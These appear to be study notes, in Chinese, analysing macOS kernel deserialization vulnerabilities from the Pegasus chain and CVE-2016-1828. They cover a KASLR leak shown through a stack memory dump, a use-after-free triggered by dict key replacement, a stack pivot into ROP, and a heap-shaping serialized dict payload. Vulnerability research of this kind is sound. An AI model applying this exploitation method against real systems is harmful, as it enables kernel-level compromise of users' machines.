# 反序列化漏洞分析

## poc执行

程序必须通过32位编译才可以运行，64位的话会出现找不到函数





### 程序逻辑

打开设备申请新的设备
另外接口文件在device/device.defs里面
Iouserclinet里面调用了序列化与反序列化的函数
Osdata在64位和number结构一样大，所以用的他



https://github.com/zhengmin1989/OS-X-10.11.6-Exp-via-PEGASUS/blob/master/exp.m再加个别人的poc把，自己做不会了还能看看

加个分析

https://www.anquanke.com/post/id/169191

https://amywushu.github.io/2016/12/16/%E8%AF%91-Analysis-and-exploitation-of-Pegasus-kernel-vulnerabilities-CVE-2016-4655-CVE-2016-4656.html

因为他的那个函数不断断点，所以我换了个函数

_io_register_entry_set_por



## 程序泄露aslr

```
case kOSSerializeNumber:
    bufferPos += sizeof(long long);
    if (bufferPos > bufferSize) break;
    value = next[1];
    value <<= 32;
    value |= next[0];
    o = OSNumber::withNumber(value, len);
    next += 2;
    break;
```

虽然漏洞在OSUnserializeBinary中，但是这个函数只是没有校验长度，而实际泄漏的是
_is_io_registry_entry_get_property_bytes里面的栈内存

内存如下

0xffffff8863f5bdb0: 0x4141414141414141 0xffffff800cbde684
0xffffff8863f5bdc0: 0xffffff800cb84000 0x0000000000000004
0xffffff8863f5bdd0: 0xffffff800d8455a0 0xffffff800cbde6b4
0xffffff8863f5bde0: 0xffffff8863f5be20 0xffffff8002d5ebff->0xffffff8002c00000

指针的位置用来破解kaslr



### 程序利用

这个程序要在

```
if(dict)
{
    if(sym){
        if(o!=dict)ok=dict->setObject(sym,o);
        o->release();
        sym->release();
        sym=0;
    }
    
}
```

当程序新的索引替换旧的的时候内存被释放，

当继续创建索引的时候出发vtable

### 程序利用修改

原本的程序是利用null pape的

但是新版不能这么用

所以搜索gadget找到xchg eax，esp

这个程序会清空高32位并且交换两个寄存器，eax正好是我们的虚表，把它伪造为用户地址，然后rop

<dict>                              <!--   0: dict                                    -->
​    <key>a</key>                    <!--   1: key "a"                                 -->
​    <integer>10</integer>           <!--   2: allocate block1                         -->
​    <key>b</key>                    <!--   3: key "b"                                 -->
​    <integer>20</integer>           <!--   4: allocate block2                         -->
​    <key>a</key>                    <!--   5: key "a"                                 -->
​    <true/>                         <!--   6: free block1; free list: block1          -->
​    <key>b</key>                    <!--   7: key "b"                                 -->
​    <true/>                         <!--   8: free block2; free list: block2, block1  -->
​    <key>a</key>                    <!--   9: key "a"                                 -->
​    <data> vtable pointer </data>   <!--  10: OSData gets block2, data gets block1    -->
​    <key>b</key>                    <!--  11: key "b"                                 -->

()<object>2</object>              <!--  12: block1->retain()                        -->

</dict>





exp参见cve-2016-1828.m